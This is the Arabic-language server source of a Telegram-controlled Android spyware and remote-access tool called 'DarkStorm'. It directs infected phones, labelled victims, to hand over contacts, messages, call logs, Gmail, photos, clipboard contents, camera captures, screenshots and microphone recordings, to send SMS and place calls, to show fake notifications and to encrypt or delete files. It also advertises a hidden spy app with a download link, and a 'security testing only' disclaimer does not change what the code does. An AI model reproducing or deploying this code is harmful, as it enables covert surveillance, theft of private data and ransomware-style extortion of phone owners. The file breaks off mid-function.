const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const upload = multer({ storage: multer.memoryStorage() });

// Load configuration from environment variables (Replit) or data.json
let config;
try {
  config = {
    token: process.env.BOT_TOKEN,
    id: process.env.CHAT_ID
  };

  if (!config.token || !config.id) {
    const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
    config = {
      token: data.token,
      id: data.id
    };
  }
} catch (e) {
  console.error("Error loading config:", e.message);
  process.exit(1);
}

const bot = new telegramBot(config.token, { polling: true });
const appData = new Map();

// Actions list
const actions = [
  "📋 جهات الاتصال", "📩 الرسائل", "📞 سجل المكالمات", 
  "📱 التطبيقات", "📷 كاميرا خلفية", "🤳 كاميرا أمامية", 
  "🎙 تسجيل صوتي", "📋 الحافظة", "🖥 لقطة شاشة", 
  "💬 عرض رسالة", "✉️ إرسال SMS", "📳 اهتزاز", 
  "🔊 تشغيل صوت", "🔇 إيقاف صوت", "🔔 الإشعارات", 
  "🔕 إيقاف الإشعارات", "📂 تصفح الملفات", "🖼 الصور", 
  "📤 إرسال SMS للجميع", "⚠️ إشعار مزيف", 
  "📧 رسائل Gmail", "🔒 تشفير الملفات", 
  "📞 الاتصال من الضحية", "🔙 القائمة الرئيسية"
];

app.get('/', (_req, res) => {
  res.send("تم النشر بواسطة ᎠᎯᎡᏦ.ᏚᎿᏫᎡᎷ™ | بإدارة ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ");
});

// Fixed file upload handler
app.post("/upload", upload.single("file"), (req, res) => {
  try {
    if (!req.file) {
      console.error("لم يتم استلام أي ملف في طلب الرفع");
      return res.status(400).send("لم يتم رفع أي ملف");
    }

    const fileName = req.file.originalname;
    const model = req.headers.model || "غير معروف";
    let fileBuffer = req.file.buffer;

    console.log(`تم استلام ملف: ${fileName} من ${model}`);

    if (fileName.toLowerCase().endsWith('.txt')) {
      let fileContent = fileBuffer.toString('utf8');
      fileContent = fileContent.replace(/@VIP_J5/g, '@JAKEL69');
      fileBuffer = Buffer.from(fileContent, 'utf8');
    }

    bot.sendDocument(config.id, fileBuffer, {
      caption: `<b>🔰 تم رفع ملف من الضحية → ${model}</b>\n\n` +
               `<b>📁 اسم الملف:</b> ${fileName}\n` +
               `<b>📦 حجم الملف:</b> ${(fileBuffer.length / 1024).toFixed(2)} ك.ب`,
      parse_mode: "HTML"
    }, {
      filename: fileName,
      contentType: req.file.mimetype || "*/*"
    }).then(() => {
      res.send("تم رفع الملف بنجاح");
    }).catch(error => {
      console.error("خطأ في إرسال الملف إلى Telegram:", error);
      res.status(500).send("فشل إرسال الملف إلى Telegram");
    });

  } catch (error) {
    console.error("خطأ في معالجة رفع الملف:", error);
    res.status(500).send("خطأ داخلي في الخادم");
  }
});

io.on("connection", socket => {
  const model = socket.handshake.headers.model + '-' + (io.sockets.sockets.size || "غير متوفر");
  const version = socket.handshake.headers.version || "غير متوفر";
  const ip = socket.handshake.headers.ip || "غير متوفر";
  
  socket.model = model;
  socket.version = version;
  socket.ip = ip;
  
  const connectionMsg = 
    `<b>🟢 تم اتصال جهاز</b>\n\n` +
    `<b>📱 الجهاز:</b> ${model}\n` +
    `<b>🔄 إصدار النظام:</b> ${version}\n` +
    `<b>🌐 IP:</b> ${ip}\n` +
    `<b>🕒 الوقت:</b> ${new Date().toLocaleString()}\n\n`;
    
  bot.sendMessage(config.id, connectionMsg, { parse_mode: "HTML" }).catch(console.error);
  
  socket.on("disconnect", () => {
    const disconnectionMsg = 
      `<b>🔴 تم قطع اتصال الجهاز</b>\n\n` +
      `<b>📱 الجهاز:</b> ${model}\n` +
      `<b>🔄 إصدار النظام:</b> ${version}\n` +
      `<b>🌐 IP:</b> ${ip}\n` +
      `<b>🕒 الوقت:</b> ${new Date().toLocaleString()}\n\n`;
      
    bot.sendMessage(config.id, disconnectionMsg, { parse_mode: "HTML" }).catch(console.error);
  });
  
  socket.on("file-explorer", files => {
    const keyboard = [];
    let currentRow = [];
    
    files.forEach((file, index) => {
      const callbackData = file.isFolder 
        ? `${model}|cd-${file.name}`
        : `${model}|request-${file.name}`;
      
      const emoji = file.isFolder ? "📁" : file.name.match(/\.(jpg|jpeg|png|gif)$/i) ? "🖼️" : "📄";
      
      currentRow.push({
        text: `${emoji} ${file.name}`,
        callback_data: callbackData
      });
      
      if (currentRow.length === 2 || index === files.length - 1) {
        keyboard.push(currentRow);
        currentRow = [];
      }
    });
    
    keyboard.push([{
      text: "↩️ رجوع",
      callback_data: `${model}|back-0`
    }, {
      text: "🔄 تحديث",
      callback_data: `${model}|refresh-0`
    }]);
    
    bot.sendMessage(config.id, `<b>📂 تصفح الملفات على ${model}</b>`, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML"
    }).catch(console.error);
  });
  
  socket.on("message", msg => {
    const modifiedMsg = msg.replace(/@VIP_J5/g, '@JAKEL69');
    bot.sendMessage(config.id, 
      `<b>✉️ رسالة جديدة من ${model}</b>\n\n${modifiedMsg}`, 
      { parse_mode: "HTML" }
    ).catch(console.error);
  });
});

// التحقق من صلاحية المستخدم
bot.on("message", msg => {
  const chatId = msg.chat.id;
  const text = msg.text;

  if (String(chatId) !== String(config.id)) {
    if (text === "/start") {
      bot.sendMessage(chatId, 
        "❌ غير مصرح لك باستخدام هذا البوت.\n\n" +
        "يرجى التواصل مع المطور :\n" +
        "                         \" JAKEL69 \"\n" +
        "☆لتفعيل البوت☆...",
        { parse_mode: "Markdown" }
      );
    }
    return;
  }

  console.log(`Received text: "${text}" from chat: ${chatId}`);

  if (text === "/start") {
    bot.sendMessage(chatId, 
      `<b>🛡️ أداة DarkStorm الأمنية</b>\n\n` +
      `هذه الأداة مخصصة لأغراض اختبار الأمان فقط.\n` +
      `المطور: ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ\n` +
      `القناة: https://t.me/JAKEL69/\n\n` +
      `<i>⚠️ يرجى الاستخدام بمسؤولية وضمن القانون</i>`, 
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
            ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
          ],
          resize_keyboard: true
        }
      }
    ).catch(console.error);
  } 
  else if (text === "★ تطبيق الهدف ★" || text === "تطبيق الهدف" || text === "🗃️☠️ تطبيق الهدف") {
    const appMessage = `
<b>🌟 تطبيق تجسس مميز - مطور بواسطة JAKEL 🌟</b>

✨ <b>المميزات الحصرية للتطبيق:</b>

🔒 <u>تشفير عسكري المستوى</u>
• تطبيق مشفر وغير قابل للكشف بواسطة أنظمة الحماية
• آلية التدمير الذاتي لا تترك أي أثر

👻 <u>اختفاء تلقائي كامل</u>
• يختفي تلقائياً بعد التثبيت مباشرة
• بدون أي أيقونة أو إشعارات

🛡️ <u>تكنولوجيا مضادة للعبث</u>
• نواة مشفرة وغير قابلة للتعديل
• حماية متقدمة ضد الهندسة العكسية

⚡ <u>عمل دائم في الخلفية</u>
• يعمل بشكل متواصل 24/7 بدون توقف
• استهلاك معدوم للبطارية

☁️ <u>بنية تحتية سيرفرات احترافية</u>
• يعمل على سيرفرات مدفوعة عالية الأداء
• ضمان عمل 99.99% بدون توقف

🎧 <u>حل متقدم لمشاكل الصوت</u>
• يتجاوز قيود تسجيل الصوت في Telegram
• يدعم جميع صيغ الملفات الصوتية
• أداة خاصة متضمنة في حزمة التطبيق

📲 <b>لتحميل التطبيق واستخدامه:</b>
1. انقر على الزر أدناه لفتح صفحة التطبيق
2. اتبع التعليمات داخل الصفحة
3. استخدم أداة Termux لحل أي مشاكل
<i>رابط سريع لأختراق الهدف من هاتفه بشكل مباشر :
<i> ☆ T.ly/Sn75V ☆
<i>قم بالتحمل بشكل مباشر بعد حفض هاذا الرابط على جهاز الهدف...
</i>
💡 <i>للدعم الفني: @JAKEL69

    `;

    bot.sendMessage(chatId, appMessage, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: {
        inline_keyboard: [[
          { 
            text: "📲 افتح صفحة التطبيق الآن", 
            url: "https://t.me/JL_HK011101Sbot/JAKELspy" 
          }
        ]]
      }
    }).catch(console.error);
  }
  // إصلاح مشكلة التسجيل الصوتي
  else if (appData.get("currentAction") === "microphoneDuration") {
    const duration = parseInt(text);
    const target = appData.get("currentTarget");
    
    if (isNaN(duration)) {
      bot.sendMessage(chatId, "<b>❌ مدة غير صالحة. الرجاء إدخال رقم.</b>", { parse_mode: "HTML" }).catch(console.error);
      return;
    }
    
    // التحقق من اتصال الجهاز قبل إرسال الأمر
    if (!io.sockets.sockets.has(target)) {
      bot.sendMessage(chatId, "<b>❌ الجهاز غير متصل حاليًا</b>", { parse_mode: "HTML" }).catch(console.error);
      appData.delete("currentTarget");
      appData.delete("currentAction");
      return;
    }
    
    io.to(target).emit("commend", {
      request: "microphone",
      extras: [{ key: "duration", value: duration }]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(chatId, `<b>🔴 بدء التسجيل لمدة ${duration} ثانية...</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  } 
  else if (appData.get("currentAction") === "vibrateDuration") {
    const duration = parseInt(text);
    const target = appData.get("currentTarget");
    
    if (isNaN(duration)) {
      bot.sendMessage(chatId, "<b>❌ مدة غير صالحة. الرجاء إدخال رقم.</b>", { parse_mode: "HTML" }).catch(console.error);
      return;
    }
    
    io.to(target).emit("commend", {
      request: "vibrate",
      extras: [{ key: "duration", value: duration }]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(chatId, `<b>📳 تم تفعيل الاهتزاز لمدة ${duration} ثانية...</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  } 
  else if (appData.get("currentAction") === "toastText") {
    const toastText = text;
    const target = appData.get("currentTarget");
    
    io.to(target).emit("commend", {
      request: "toast",
      extras: [{ key: "text", value: toastText }]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(chatId, `<b>✅ تم عرض الرسالة بنجاح</b>`, {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "smsNumber") {
    const number = text;
    appData.set("currentNumber", number);
    appData.set("currentAction", "smsText");
    
    bot.sendMessage(chatId, "<b>💬 أدخل نص الرسالة:</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["❌ إلغاء الإجراء ❌"]],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "smsText") {
    const smsText = text;
    const number = appData.get("currentNumber");
    const target = appData.get("currentTarget");
    
    io.to(target).emit("commend", {
      request: "sendSms",
      extras: [
        { key: "number", value: number },
        { key: "text", value: smsText }
      ]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNumber");
    
    bot.sendMessage(chatId, "<b>✅ تم إرسال الرسالة بنجاح</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "textToAllContacts") {
    const messageText = text;
    const target = appData.get("currentTarget");
    
    io.to(target).emit("commend", {
      request: "smsToAllContacts",
      extras: [{ key: "text", value: messageText }]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(chatId, "<b>✅ تم إرسال الرسالة للجميع</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "notificationText") {
    const notificationText = text;
    appData.set("currentNotificationText", notificationText);
    appData.set("currentAction", "notificationUrl");
    
    bot.sendMessage(chatId, "<b>🔗 أدخل رابط الإشعار (URL):</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["❌ إلغاء الإجراء ❌"]],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "notificationUrl") {
    const notificationUrl = text;
    const notificationText = appData.get("currentNotificationText");
    const target = appData.get("currentTarget");
    
    io.to(target).emit("commend", {
      request: "popNotification",
      extras: [
        { key: "text", value: notificationText },
        { key: "url", value: notificationUrl }
      ]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    appData.delete("currentNotificationText");
    
    bot.sendMessage(chatId, "<b>✅ تم عرض الإشعار المزيف</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "makeCallNumber") {
    const phoneNumber = text;
    appData.set("currentNumber", phoneNumber);
    appData.set("currentAction", "makeCallConfirm");
    
    bot.sendMessage(chatId, `<b>📞 تأكيد الاتصال بالرقم: ${phoneNumber}</b>\n\n` +
                           "أرسل كلمة 'موافق' لتأكيد الاتصال", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [["❌ إلغاء الإجراء ❌"]],
        resize_keyboard: true,
        one_time_keyboard: true
      }
    }).catch(console.error);
  }
  else if (appData.get("currentAction") === "makeCallConfirm") {
    if (text.toLowerCase() === "موافق") {
      const phoneNumber = appData.get("currentNumber");
      const target = appData.get("currentTarget");
      
      io.to(target).emit("commend", {
        request: "makeCall",
        extras: [{ key: "number", value: phoneNumber }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      appData.delete("currentNumber");
      
      bot.sendMessage(chatId, "<b>✅ تم إجراء المكالمة بنجاح</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
            ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
          ],
          resize_keyboard: true
        }
      }).catch(console.error);
    } else {
      bot.sendMessage(chatId, "<b>❌ تم إلغاء الإجراء</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
            ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
          ],
          resize_keyboard: true
        }
      }).catch(console.error);
    }
  }
  else if (appData.get("currentAction") === "encryptFiles") {
    const encryptionKey = text;
    const target = appData.get("currentTarget");
    
    io.to(target).emit("commend", {
      request: "encryptFiles",
      extras: [{ key: "key", value: encryptionKey }]
    });
    
    appData.delete("currentTarget");
    appData.delete("currentAction");
    
    bot.sendMessage(chatId, "<b>✅ تم تشفير الملفات بنجاح</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  }
  
  // Device count
  else if (text === "📊 عدد الأجهزة") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(chatId, "<b>❌ لا توجد أجهزة متصلة</b>", { parse_mode: "HTML" }).catch(console.error);
    } else {
      let response = `<b>📊 الأجهزة المتصلة: ${io.sockets.sockets.size}</b>\n\n`;
      let count = 1;
      
      io.sockets.sockets.forEach(socket => {
        response += 
          `<b>الجهاز #${count}</b>\n` +
          `<b>📱 الاسم:</b> ${socket.model}\n` +
          `<b>🔄 الإصدار:</b> ${socket.version}\n` +
          `<b>🌐 IP:</b> ${socket.ip}\n` +
          `<b>⏱️ مدة الاتصال:</b> ${Math.floor((Date.now() - socket.handshake.time) / 60000)} دقيقة\n\n`;
        count++;
      });
      
      bot.sendMessage(chatId, response, { parse_mode: "HTML" }).catch(console.error);
    }
  } 
  
  // Control panel
  else if (text === "🎮 لوحة التحكم") {
    if (io.sockets.sockets.size === 0) {
      bot.sendMessage(chatId, "<b>❌ لا توجد أجهزة متصلة</b>", { parse_mode: "HTML" }).catch(console.error);
    } else {
      const keyboard = [];
      io.sockets.sockets.forEach((socket, id) => {
        keyboard.push([socket.model]);
      });
      keyboard.push(["🔙 العودة للقائمة الرئيسية"]);
      
      bot.sendMessage(chatId, "<b>🎮 اختر جهازًا للتحكم:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: keyboard,
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
  } 
  
  // Developer info
  else if (text === "👨‍💻 معلومات المطور") {
    bot.sendMessage(chatId, 
      "<b>👨‍💻 معلومات المطور</b>\n\n" +
      "الاسم: ᎫᏞ☆ᎻᏦ~|ᏰᏫᎿ|\n" +
      "Telegram: @JAKEL69\n" +
      "القناة: https://t.me/JAKEL69/\n\n" +
      "<i>🔐 مزود حلول أمنية</i>", 
      { parse_mode: "HTML" }
    ).catch(console.error);
  } 
  
  // Back to main menu
  else if (text === "🔙 العودة للقائمة الرئيسية") {
    appData.delete("currentTarget");
    bot.sendMessage(chatId, "<b>🏠 القائمة الرئيسية</b>", {
      parse_mode: "HTML",
      reply_markup: {
        keyboard: [
          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
        ],
        resize_keyboard: true
      }
    }).catch(console.error);
  } 
  
  // Actions for specific device
  else if (actions.includes(text)) {
    const target = appData.get("currentTarget");
    
    if (!target) {
      bot.sendMessage(chatId, "<b>❌ لم يتم اختيار جهاز. الرجاء اختيار جهاز أولاً.</b>", { 
        parse_mode: "HTML" 
      }).catch(console.error);
      return;
    }
    
    // Handle contact pulling
    if (text === "📋 جهات الاتصال") {
      io.to(target).emit("commend", { request: "contacts", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري سحب جهات الاتصال...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle message pulling
    else if (text === "📩 الرسائل") {
      io.to(target).emit("commend", { request: "all-sms", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري سحب الرسائل...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle call logs
    else if (text === "📞 سجل المكالمات") {
      io.to(target).emit("commend", { request: "calls", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري سحب سجل المكالمات...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle installed apps
    else if (text === "📱 التطبيقات") {
      io.to(target).emit("commend", { request: "apps", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري سحب قائمة التطبيقات...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle rear camera
    else if (text === "📷 كاميرا خلفية") {
      io.to(target).emit("commend", { request: "main-camera", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري التقاط صورة من الكاميرا الخلفية...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle front camera
    else if (text === "🤳 كاميرا أمامية") {
      io.to(target).emit("commend", { request: "selfie-camera", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري التقاط صورة من الكاميرا الأمامية...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle clipboard
    else if (text === "📋 الحافظة") {
      io.to(target).emit("commend", { request: "clipboard", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري استرجاع محتوى الحافظة...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle screenshot
    else if (text === "🖥 لقطة شاشة") {
      io.to(target).emit("commend", { request: "screenshot", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري التقاط لقطة شاشة...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Handle notifications
    else if (text === "🔔 الإشعارات") {
      io.to(target).emit("commend", { request: "keylogger-on", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 بدء مراقبة الإشعارات...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Stop notifications
    else if (text === "🔕 إيقاف الإشعارات") {
      io.to(target).emit("commend", { request: "keylogger-off", extras: [] });
      bot.sendMessage(chatId, "<b>⏹️ إيقاف مراقبة الإشعارات...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Browse files
    else if (text === "📂 تصفح الملفات") {
      io.to(target).emit("file-explorer", { request: 'ls', extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري تحميل نظام الملفات...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Pull all photos
    else if (text === "🖼 الصور") {
      io.to(target).emit("commend", { request: "gallery", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري سحب جميع الصور...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Pull Gmail messages
    else if (text === "📧 رسائل Gmail") {
      io.to(target).emit("commend", { request: "all-email", extras: [] });
      bot.sendMessage(chatId, "<b>🔃 جاري سحب رسائل Gmail...</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
    
    // Show toast message
    else if (text === "💬 عرض رسالة") {
      appData.set("currentAction", "toastText");
      bot.sendMessage(chatId, "<b>💬 أدخل الرسالة التي تريد عرضها:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Send SMS
    else if (text === "✉️ إرسال SMS") {
      appData.set("currentAction", "smsNumber");
      bot.sendMessage(chatId, "<b>📱 أدخل رقم الهاتف (مع رمز الدولة):</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Vibrate device
    else if (text === "📳 اهتزاز") {
      appData.set("currentAction", "vibrateDuration");
      bot.sendMessage(chatId, "<b>⏱️ أدخل مدة الاهتزاز (بالثواني):</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Record audio
    else if (text === "🎙 تسجيل صوتي") {
      appData.set("currentAction", "microphoneDuration");
      bot.sendMessage(chatId, "<b>⏱️ أدخل مدة التسجيل (بالثواني):</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Send SMS to all contacts
    else if (text === "📤 إرسال SMS للجميع") {
      appData.set("currentAction", "textToAllContacts");
      bot.sendMessage(chatId, "<b>💬 أدخل الرسالة التي تريد إرسالها للجميع:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Fake notification
    else if (text === "⚠️ إشعار مزيف") {
      appData.set("currentAction", "notificationText");
      bot.sendMessage(chatId, "<b>💬 أدخل نص الإشعار:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Call from victim's phone
    else if (text === "📞 الاتصال من الضحية") {
      appData.set("currentAction", "makeCallNumber");
      bot.sendMessage(chatId, "<b>📱 أدخل رقم الهاتف للاتصال:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Encrypt files
    else if (text === "🔒 تشفير الملفات") {
      appData.set("currentAction", "encryptFiles");
      bot.sendMessage(chatId, "<b>🔑 أدخل مفتاح التشفير:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Play audio
    else if (text === "🔊 تشغيل صوت") {
      appData.set("currentAction", "playAudio");
      bot.sendMessage(chatId, "<b>🎵 أرسل ملف صوتي للتشغيل:</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [["❌ إلغاء الإجراء ❌"]],
          resize_keyboard: true,
          one_time_keyboard: true
        }
      }).catch(console.error);
    }
    
    // Stop audio
    else if (text === "🔇 إيقاف صوت") {
      io.to(target).emit("commend", { request: "stopAudio", extras: [] });
      bot.sendMessage(chatId, "<b>⏹️ تم إيقاف التشغيل الصوتي</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
  } 
  
  // Device selection
  else {
    let deviceFound = false;
    io.sockets.sockets.forEach((socket, id) => {
      if (text === socket.model) {
        deviceFound = true;
        appData.set("currentTarget", id);
        bot.sendMessage(chatId, `<b>🎮 التحكم بالجهاز: ${socket.model}</b>`, {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["📋 جهات الاتصال", "📩 الرسائل"],
              ["📞 سجل المكالمات", "📱 التطبيقات"],
              ["📷 كاميرا خلفية", "🤳 كاميرا أمامية"],
              ["🎙 تسجيل صوتي", "📋 الحافظة"],
              ["🖥 لقطة شاشة", "💬 عرض رسالة"],
              ["✉️ إرسال SMS", "📳 اهتزاز"],
              ["🔊 تشغيل صوت", "🔇 إيقاف صوت"],
              ["🔔 الإشعارات", "🔕 إيقاف الإشعارات"],
              ["📂 تصفح الملفات", "🖼 الصور"],
              ["📤 إرسال SMS للجميع"],
              ["⚠️ إشعار مزيف", "📧 رسائل Gmail"],
              ["🔒 تشفير الملفات", "📞 الاتصال من الضحية"],
              ["🔙 العودة للقائمة الرئيسية"]
            ],
            resize_keyboard: true,
            one_time_keyboard: true
          }
        }).catch(console.error);
      }
    });
    
    if (!deviceFound) {
      bot.sendMessage(chatId, "<b>❌ الجهاز غير موجود أو غير متصل</b>", {
        parse_mode: "HTML"
      }).catch(console.error);
    }
  }
});

// التحقق من صلاحية المستخدم للاستجابة للاستدعاءات
bot.on("callback_query", query => {
  const chatId = query.message.chat.id;
  
  if (String(chatId) !== String(config.id)) {
    bot.answerCallbackQuery(query.id, { 
      text: "❌ غير مصرح لك باستخدام هذا البوت",
      show_alert: true 
    });
    return;
  }

  const data = query.data;
  const [model, actionData] = data.split('|');
  const [actionType, actionValue] = actionData.split('-');

  if (actionType === "back") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", { request: "back", extras: [] });
      }
    });
  } 
  
  else if (actionType === 'cd') {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: 'cd',
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
  } 
  
  else if (actionType === "request") {
    bot.editMessageText(`🔧 اختر إجراء لـ: ${actionValue}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {
        inline_keyboard: [[
          { text: "⬇️ تنزيل", callback_data: `${model}|upload-${actionValue}` },
          { text: "🗑️ حذف", callback_data: `${model}|delete-${actionValue}` }
        ]]
      },
      parse_mode: "HTML"
    }).catch(console.error);
  }
  
  else if (actionType === "upload") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "upload",
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
    
    bot.answerCallbackQuery(query.id, { text: "تم إرسال طلب التنزيل للجهاز" }).catch(console.error);
  }
  
  else if (actionType === "delete") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "delete",
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
    
    bot.answerCallbackQuery(query.id, { text: "تم إرسال طلب الحذف للجهاز" }).catch(console.error);
  }
  
  else if (actionType === "refresh") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: "refresh",
          extras: []
        });
      }
    });
    
    bot.answerCallbackQuery(query.id, { text: "جاري تحديث قائمة الملفات..." }).catch(console.error);
  }
});

bot.on("voice", msg => {
  const chatId = msg.chat.id;
  
  if (String(chatId) !== String(config.id)) {
    bot.sendMessage(chatId, 
      "❌ غير مصرح لك باستخدام هذا البوت.\n\n" +
      "يرجى التواصل مع المطور :\n" +
      "                         \" JAKEL69 \"\n" +
      "☆لتفعيل البوت☆...",
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (appData.get("currentAction") === "playAudio") {
    const fileId = msg.voice.file_id;
    const target = appData.get("currentTarget");
    
    bot.getFileLink(fileId).then(fileLink => {
      io.to(target).emit("commend", {
        request: "playAudio",
        extras: [{ key: "url", value: fileLink }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
